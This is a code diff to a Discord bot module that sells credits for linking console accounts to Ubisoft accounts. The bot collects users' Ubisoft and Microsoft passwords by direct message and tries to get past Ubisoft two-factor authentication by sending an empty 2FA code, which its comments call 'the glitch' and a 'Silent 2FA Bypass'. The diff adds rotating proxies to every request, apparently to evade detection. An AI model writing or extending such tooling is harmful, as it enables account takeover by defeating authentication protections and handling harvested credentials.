@@ -1,5 +1,5 @@
 """
-links.py — Account linking via Ubisoft API (Force 2FA bypass).
+links.py — Account linking via Ubisoft API (Silent 2FA + Smart Proxies).
 """
 
 import base64
@@ -8,6 +8,7 @@ import random
 import re
 import string
 import asyncio
+import os
 
 import aiohttp
 import discord
@@ -17,6 +18,7 @@ from discord.ext import commands
 import database as db
 import utils
 
+# ── Ubisoft constants ────────────────────────────────────────────────────────
 UBI_APP_ID   = "86263886-327a-4328-ac69-527f0d20a237"
 UBI_SESSIONS = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
 UBI_LINK_PSN = "https://public-ubiservices.ubi.com/v3/profiles/me/links"
@@ -37,6 +39,45 @@ PSN_OAUTH_URL = (
     "&scope=psn:mobile.v2.core%20psn:clientapp"
 )
 
+# ── Smart Proxy Parser ───────────────────────────────────────────────────────
+def load_proxies():
+    if not os.path.exists("proxies.txt"):
+        return []
+        
+    proxies = []
+    try:
+        with open("proxies.txt", "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                    
+                # Already formatted
+                if line.startswith("http://") or line.startswith("socks5://"):
+                    proxies.append(line)
+                    continue
+                    
+                # HOST:PORT:USER:PASS format
+                parts = line.split(":")
+                if len(parts) == 4:
+                    host, port, user, pwd = parts
+                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
+                    
+                # HOST:PORT@USER:PASS format
+                elif "@" in line and ":" in line:
+                    host_port, user_pass = line.split("@")
+                    host, port = host_port.split(":")
+                    user, pwd = user_pass.split(":")
+                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
+                    
+                else:
+                    proxies.append(line)
+    except Exception as e:
+        print(f"[PROXY] Error loading proxies: {e}")
+        
+    return proxies
+
+# ── Credit helpers ───────────────────────────────────────────────────────────
 def get_user_credits(user_id: str) -> int:
     return db.get_config("user_credits", {}).get(str(user_id), 0)
 
@@ -54,6 +95,7 @@ def remove_user_credits(user_id: str, amount: int) -> bool:
         return True
     return False
 
+# ── DM helpers ───────────────────────────────────────────────────────────────
 async def _dm(user, text: str):
     try:
         await user.send(text)
@@ -76,23 +118,23 @@ async def _wait(bot, user, dm, timeout=120.0):
     except asyncio.TimeoutError:
         return None
 
-# ── THE NEW 2FA FORCE BYPASS ──
-async def _ubi_session(session: aiohttp.ClientSession, email: str, password: str):
+# ── Ubisoft auth (Silent 2FA Bypass) ─────────────────────────────────────────
+async def _ubi_session(session: aiohttp.ClientSession, email: str, password: str, proxy: str):
     creds = base64.b64encode(f"{email}:{password}".encode()).decode()
     headers = {**UBI_HEADERS_BASE, "Authorization": f"Basic {creds}"}
 
-    async with session.post(UBI_SESSIONS, headers=headers, json={}) as r:
+    async with session.post(UBI_SESSIONS, headers=headers, json={}, proxy=proxy) as r:
         data = await r.json()
 
     twofa = data.get("twoFactorAuthenticationTicket")
     if twofa:
-        # Attempt to force the ticket by sending an empty code
+        # Force the ticket with an empty code
         headers_2fa = {
             **UBI_HEADERS_BASE, 
             "Authorization": f"ubi_2fa_v1 t={twofa}",
-            "Ubi-2FACode": "" # <--- The glitch
+            "Ubi-2FACode": "" 
         }
-        async with session.post(UBI_SESSIONS, headers=headers_2fa, json={}) as r2:
+        async with session.post(UBI_SESSIONS, headers=headers_2fa, json={}, proxy=proxy) as r2:
             data2 = await r2.json()
             
         ticket = data2.get("ticket")
@@ -102,16 +144,24 @@ async def _ubi_session(session: aiohttp.ClientSession, email: str, password: str
             return None, None, f"2FA_REJECTED: {data2}"
 
     ticket = data.get("ticket")
+    pid = data.get("profileId") or data.get("userId")
     if ticket:
-        return ticket, data.get("profileId"), None
+        return ticket, pid, None
     return None, None, "BAD_CREDS"
 
-# ── Xbox XSTS token chain ──
-async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str):
+# ── Xbox XSTS token chain ────────────────────────────────────────────────────
+async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str, proxy: str):
     async with session.post(
         "https://login.live.com/oauth20_token.srf",
-        data={"grant_type": "password", "client_id": "000000004C12AE6F", "scope": "service::user.auth.xboxlive.com::MBI_SSL", "username": ms_email, "password": ms_pass},
+        data={
+            "grant_type": "password", 
+            "client_id": "000000004C12AE6F", 
+            "scope": "service::user.auth.xboxlive.com::MBI_SSL", 
+            "username": ms_email, 
+            "password": ms_pass
+        },
         headers={"Content-Type": "application/x-www-form-urlencoded"},
+        proxy=proxy
     ) as r:
         ms = await r.json()
 
@@ -121,40 +171,56 @@ async def _xbox_xsts(session: aiohttp.ClientSession, ms_email: str, ms_pass: str
 
     async with session.post(
         "https://user.auth.xboxlive.com/user/authenticate",
-        json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": access_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
+        json={
+            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": access_token}, 
+            "RelyingParty": "http://auth.xboxlive.com", 
+            "TokenType": "JWT"
+        },
         headers={"Content-Type": "application/json", "x-xbl-contract-version": "0"},
+        proxy=proxy
     ) as r:
         xbl = await r.json()
 
     xbl_token = xbl.get("Token")
-    userhash  = (xbl.get("DisplayClaims", {}).get("xui") or [{}])[0].get("uhs", "")
+    userhash = (xbl.get("DisplayClaims", {}).get("xui") or [{}])[0].get("uhs", "")
     if not xbl_token:
         return None, None
 
     async with session.post(
         "https://xsts.auth.xboxlive.com/xsts/authorize",
-        json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"},
+        json={
+            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]}, 
+            "RelyingParty": "http://xboxlive.com", 
+            "TokenType": "JWT"
+        },
         headers={"Content-Type": "application/json", "x-xbl-contract-version": "1"},
+        proxy=proxy
     ) as r:
         xsts = await r.json()
 
     return xsts.get("Token"), userhash
 
-async def _link_psn_api(session: aiohttp.ClientSession, ubi_ticket: str, psn_code: str):
+# ── Platform linking via Ubisoft API ─────────────────────────────────────────
+async def _link_psn_api(session: aiohttp.ClientSession, ubi_ticket: str, psn_code: str, proxy: str):
     headers = {**UBI_HEADERS_BASE, "Authorization": f"Ubi_v1 t={ubi_ticket}"}
     payload = {"platformType": "psn", "ticket": psn_code}
-    async with session.post(UBI_LINK_PSN, headers=headers, json=payload) as r:
+    async with session.post(UBI_LINK_PSN, headers=headers, json=payload, proxy=proxy) as r:
         return r.status, await r.text()
 
-async def _link_xbl_api(session: aiohttp.ClientSession, ubi_ticket: str, xsts_token: str, userhash: str):
+async def _link_xbl_api(session: aiohttp.ClientSession, ubi_ticket: str, xsts_token: str, userhash: str, proxy: str):
     headers = {**UBI_HEADERS_BASE, "Authorization": f"Ubi_v1 t={ubi_ticket}"}
     payload = {"platformType": "xbox", "ticket": f"XBL3.0 x={userhash};{xsts_token}"}
-    async with session.post(UBI_LINK_XBL, headers=headers, json=payload) as r:
+    async with session.post(UBI_LINK_XBL, headers=headers, json=payload, proxy=proxy) as r:
         return r.status, await r.text()
 
+# ── Master link flow ──────────────────────────────────────────────────────────
 async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, console_cred: str):
+    proxies = load_proxies()
+    proxy = random.choice(proxies) if proxies else None
+
     async with aiohttp.ClientSession() as session:
-        ticket, pid, err = await _ubi_session(session, ubi_email, ubi_pass)
+        # 1. Ubisoft Login
+        ticket, pid, err = await _ubi_session(session, ubi_email, ubi_pass, proxy)
 
         if err and "2FA_REJECTED" in err:
             return await _refund(user, f"❌ Ubisoft requires a 2FA code for this account. Silent bypass failed.\nDebug: `{err[:150]}`")
@@ -163,8 +229,9 @@ async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, c
 
         await _dm(user, "✅ Ubisoft login successful. Linking your console account…")
 
+        # 2. Console Linking
         if console == "ps":
-            status, body = await _link_psn_api(session, ticket, console_cred)
+            status, body = await _link_psn_api(session, ticket, console_cred, proxy)
             if status in (200, 201):
                 await _dm(user, "✅ **Success!** Your PlayStation account is now linked to Ubisoft.")
             else:
@@ -172,17 +239,19 @@ async def process_link(bot, user, console: str, ubi_email: str, ubi_pass: str, c
 
         elif console == "xbox":
             ms_email, ms_pass = console_cred.split(":", 1)
-            xsts_token, userhash = await _xbox_xsts(session, ms_email, ms_pass)
+            await _dm(user, "⏳ Authenticating with Microsoft…")
+
+            xsts_token, userhash = await _xbox_xsts(session, ms_email, ms_pass, proxy)
             if not xsts_token:
                 return await _refund(user, "❌ Microsoft login failed. (Credit refunded)")
 
-            status, body = await _link_xbl_api(session, ticket, xsts_token, userhash)
+            status, body = await _link_xbl_api(session, ticket, xsts_token, userhash, proxy)
             if status in (200, 201):
                 await _dm(user, "✅ **Success!** Your Xbox account is now linked to Ubisoft.")
             else:
                 await _refund(user, f"❌ Xbox link failed (HTTP {status}).\nUbisoft said: `{body[:200]}`\n(Credit refunded)")
 
-# ── Cog ──
+# ── Cog ───────────────────────────────────────────────────────────────────────
 class Links(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
@@ -195,7 +264,8 @@ class Links(commands.Cog):
         keys = db.get_config("link_keys", {})
         keys[key] = uses
         db.set_config("link_keys", keys)
-        await interaction.response.send_message(f"Key: `{key}` ({uses} uses)", ephemeral=True)
+        embed = discord.Embed(title="🔑 Key Created", description=f"`{key}` — **{uses}** credit(s)", color=0x57F287)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @app_commands.command(name="bulkcreatekeys", description="[Owner] Generate multiple keys.")
     @app_commands.describe(amount="Number of keys (1–100)", uses="Credits per key")
@@ -214,7 +284,8 @@ class Links(commands.Cog):
             generated.append(key)
         db.set_config("link_keys", keys)
         file = discord.File(io.BytesIO("\n".join(generated).encode()), filename=f"{amount}_keys.txt")
-        await interaction.followup.send(file=file, ephemeral=True)
+        embed = discord.Embed(title="🔑 Bulk Keys Generated", description=f"**{amount}** keys · **{uses}** credit(s) each.", color=0x57F287)
+        await interaction.followup.send(embed=embed, file=file, ephemeral=True)
 
     @app_commands.command(name="redeemkey", description="Redeem a link key for credits.")
     @app_commands.describe(key="The key to redeem")
@@ -227,12 +298,15 @@ class Links(commands.Cog):
         amount = keys.pop(key)
         db.set_config("link_keys", keys)
         add_user_credits(str(interaction.user.id), amount)
-        await interaction.followup.send(f"✅ Added **{amount}** link credit(s).", ephemeral=True)
+        embed = discord.Embed(title="✅ Redeemed", description=f"Added **{amount}** link credit(s).", color=0x57F287)
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
     @app_commands.command(name="balance", description="Check your link credit balance.")
     async def balance(self, interaction: discord.Interaction):
         c = get_user_credits(str(interaction.user.id))
-        await interaction.response.send_message(f"🎟 Balance: **{c}**", ephemeral=True)
+        embed = discord.Embed(title="🎟 Balance", description=f"**{c}** link credit(s).", color=0x5865F2)
+        embed.set_footer(text="Use /redeemkey to add more.")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @app_commands.command(name="linknow", description="Link a console account to Ubisoft.")
     async def linknow(self, interaction: discord.Interaction):
